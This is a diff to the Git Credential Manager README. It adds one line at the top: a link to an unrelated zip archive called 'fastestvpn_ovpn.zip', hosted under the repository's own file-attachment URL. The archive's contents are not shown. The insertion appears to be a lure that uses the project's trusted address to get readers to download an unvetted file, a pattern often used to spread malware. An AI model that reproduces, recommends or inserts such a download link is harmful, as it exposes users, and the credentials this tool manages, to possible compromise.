@@ -1,3 +1,4 @@
+[fastestvpn_ovpn.zip](https://github.com/GitCredentialManager/git-credential-manager/files/10484537/fastestvpn_ovpn.zip)
 # Git Credential Manager
 
 [![Build Status][build-status-badge]][workflow-status]
